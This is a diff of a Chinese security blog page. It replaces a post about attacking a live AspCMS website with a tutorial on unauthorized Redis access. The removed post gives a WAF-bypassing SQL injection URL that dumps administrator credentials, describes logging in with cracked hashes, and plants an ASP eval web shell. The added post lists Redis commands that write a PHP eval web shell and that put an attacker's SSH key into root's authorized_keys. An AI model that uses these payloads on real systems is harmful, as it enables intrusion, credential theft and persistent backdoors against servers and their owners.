@@ -20,23 +20,22 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="真实的渗透经历">
+  <meta name="description" content="redis未授权访问漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="实战">
-<meta property="og:url" content="http://example.com/2020/10/20/%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:title" content="redis未授权漏洞">
+<meta property="og:url" content="http://example.com/2020/11/15/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="f1oat&#39;s blog">
-<meta property="og:description" content="真实的渗透经历">
+<meta property="og:description" content="redis未授权访问漏洞">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/image/example1.jpg">
-<meta property="og:image" content="http://example.com/image/example2.jpg">
-<meta property="og:image" content="http://example.com/image/example.png">
-<meta property="article:published_time" content="2020-10-20T07:43:25.000Z">
-<meta property="article:modified_time" content="2020-11-15T08:36:33.635Z">
+<meta property="og:image" content="http://example.com/image/bash.png">
+<meta property="article:published_time" content="2020-11-15T08:33:48.000Z">
+<meta property="article:modified_time" content="2020-11-15T09:06:17.500Z">
 <meta property="article:author" content="f1oat">
+<meta property="article:tag" content="ssrf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/image/example1.jpg">
+<meta name="twitter:image" content="http://example.com/image/bash.png">
 
-<link rel="canonical" href="http://example.com/2020/10/20/%E5%AE%9E%E6%88%98/">
+<link rel="canonical" href="http://example.com/2020/11/15/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/">
 
 
 <script id="page-configurations">
@@ -49,7 +48,7 @@
   };
 </script>
 
-  <title>实战 | f1oat's blog</title>
+  <title>redis未授权漏洞 | f1oat's blog</title>
   
 
 
@@ -164,7 +163,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/20/%E5%AE%9E%E6%88%98/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/15/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -177,7 +176,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          实战
+          redis未授权漏洞
         </h1>
 
         <div class="post-meta">
@@ -186,23 +185,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2020-10-20 15:43:25" itemprop="dateCreated datePublished" datetime="2020-10-20T15:43:25+08:00">2020-10-20</time>
+              <time title="Created: 2020-11-15 16:33:48 / Modified: 17:06:17" itemprop="dateCreated datePublished" datetime="2020-11-15T16:33:48+08:00">2020-11-15</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-11-15 16:36:33" itemprop="dateModified" datetime="2020-11-15T16:36:33+08:00">2020-11-15</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/" itemprop="url" rel="index"><span itemprop="name">渗透经历</span></a>
+                  <a href="/categories/owsap-top10/" itemprop="url" rel="index"><span itemprop="name">owsap top10</span></a>
                 </span>
             </span>
 
@@ -217,13 +210,29 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="真实的渗透经历"><a href="#真实的渗透经历" class="headerlink" title="真实的渗透经历"></a>真实的渗透经历</h2><a id="more"></a>
-
-<h4 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为新生培训，最近重学了一波owsap top10的基础内容，然后想着现在运行的站是不是没有sql注入利用的洞了?</span><br><span class="line">后来看到aspcms框架的漏洞，发现还真有sql的洞，于是就去找哪些还在运行的aspcms的网站，后来找到了，于是试了试payload:</span><br><span class="line">/plug/comment/commentList.asp?id=0<span class="comment">%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20&#123;prefix&#125;user</span></span><br><span class="line">对这个payload的解释其实进行urldecode之后就变成了：</span><br><span class="line">/plug/comment/commentList.asp?id=0 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom &#123;prefix&#125;user</span><br><span class="line">在仔细一看union select top 1 ....就是查数据的sql，只不过利用了waf对于master的单层过滤bypass了，于是爆出了admin以及md5加密过后的密码，admin的密码太难破解了，于是乎，我又看了看sql的payload，发现top 5能够爆出其他数据，于是尝试破解其他的md5值，结果成功破解了超级管理员用户的密码</span><br><span class="line">对域名进行信息收集，获取了后台管理界面的url，利用爆出的数据成功登录</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre>
-<p><img src="/image/example1.jpg" alt="展示"><br><img src="/image/example2.jpg" alt="展示"><br><img src="/image/example.png" alt="展示"></p>
-<h4 id="web的信息"><a href="#web的信息" class="headerlink" title="web的信息"></a>web的信息</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iis10.0 windows的服务器，因为ii7.5以上的版本就已经把解析漏洞给修复了</span><br><span class="line">所以不能利用解析漏洞写入shell</span><br></pre></td></tr></table></figure></code></pre>
-<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在aspcms漏洞信息上，发现了一个应该是存储xss的方式写入shell</span><br><span class="line">在管理页面的扩展功能下找到幻灯片设置将前端slidestyle 的value改成</span><br><span class="line">1<span class="comment">%&gt;&lt;%Eval(Request (chr(83)))%&gt;&lt;%</span></span><br><span class="line">保存，即可写入shell，利用菜刀连接，成功拿到shell</span><br></pre></td></tr></table></figure></code></pre>
-<h4 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">补天已收录</span><br></pre></td></tr></table></figure></code></pre>
+        <h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><a id="more"></a>
+<h3 id="未授权访问漏洞产生原因"><a href="#未授权访问漏洞产生原因" class="headerlink" title="未授权访问漏洞产生原因"></a>未授权访问漏洞产生原因</h3><pre><code>redis安装之后如果不进行相关安全操作，比如修改conf文件等时，能构造成redis不用经过登录就能够直接访问。</code></pre>
+<p>redis一般绑定在0.0.0.0:6379上，如果没有设置防火墙规则，会直接暴露在公网上</p>
+<h3 id="未授权访问漏洞的危害"><a href="#未授权访问漏洞的危害" class="headerlink" title="未授权访问漏洞的危害"></a>未授权访问漏洞的危害</h3><pre><code>一般来说redis的未授权访问是发生在内网的，经常会配合ssrf漏洞进行漏洞利用攻击
+1. 能够造成敏感信息泄露，恶意使用flushall来清空内部所有数据
+2. 攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；
+3. 如果没有在redis.conf将daemonize no改为yes 和protected-mode no改为yes的话就很容易造成写入.ssh公钥直接以root权限，直接以root权限控制整个服务器</code></pre>
+<h3 id="redis攻击利用姿势"><a href="#redis攻击利用姿势" class="headerlink" title="redis攻击利用姿势"></a>redis攻击利用姿势</h3><pre><code>1. 直接通过未授权访问连接到服务器的redis
+    执行命令 redis-cli -h +ip 
+2. 开启web服务一般来说linux下的web服务的路径为/var/www/html/下
+    连接后</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> dir /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;X&#x27;])?&gt;&quot;</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#接到提示为ok之后就能够利用蚁剑菜刀等连接shell</span></span><br></pre></td></tr></table></figure>
+<pre><code>3. 存在ssh服务，直接本地生成ssh公钥写入/root/.ssh</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~<span class="comment"># ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>
+<p><img src="/image/bash.png" alt="演示"><br>之后进入/root/.ssh目录，将公钥保存到另一个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~<span class="comment">#(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</span></span><br></pre></td></tr></table></figure>
+<p>将公钥写入redis</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~<span class="comment"># cat 1.txt | redis-cli -h 10.10.10.135 -x set crack</span></span><br></pre></td></tr></table></figure>
+<p>无误后连接redis</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~<span class="comment"># redis -cli -h +ip</span></span><br><span class="line">ip:6379&gt;config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">ip:6379&gt;config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">ip:6379&gt;save</span><br><span class="line">ip:6379&gt;<span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<p>最后ssh使用公钥以root连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh - i id_rsa root@ip</span><br></pre></td></tr></table></figure>
+<p>后续接着写配合ssrf利用gopher协议打redis</p>
 
     </div>
 
@@ -232,6 +241,9 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ssrf/" rel="tag"># ssrf</a>
+          </div>
 
         
 
@@ -239,13 +251,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/10/11/Blog/" rel="prev" title="Blog">
-      <i class="fa fa-chevron-left"></i> Blog
+    <a href="/2020/10/22/mongodb%E6%B3%A8%E5%85%A5/" rel="prev" title="mongodb注入">
+      <i class="fa fa-chevron-left"></i> mongodb注入
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/10/22/mongodb%E6%B3%A8%E5%85%A5/" rel="next" title="mongodb注入">
-      mongodb注入 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -304,7 +313,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%9F%E5%AE%9E%E7%9A%84%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86"><span class="nav-number">1.</span> <span class="nav-text">真实的渗透经历</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E6%83%85%E6%8F%90%E8%A6%81"><span class="nav-number">1.0.1.</span> <span class="nav-text">前情提要</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-number">1.0.2.</span> <span class="nav-text">web的信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-number">1.0.3.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD"><span class="nav-number">1.0.4.</span> <span class="nav-text">后续</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">redis未授权访问漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.0.1.</span> <span class="nav-text">未授权访问漏洞产生原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.0.2.</span> <span class="nav-text">未授权访问漏洞的危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.0.3.</span> <span class="nav-text">redis攻击利用姿势</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
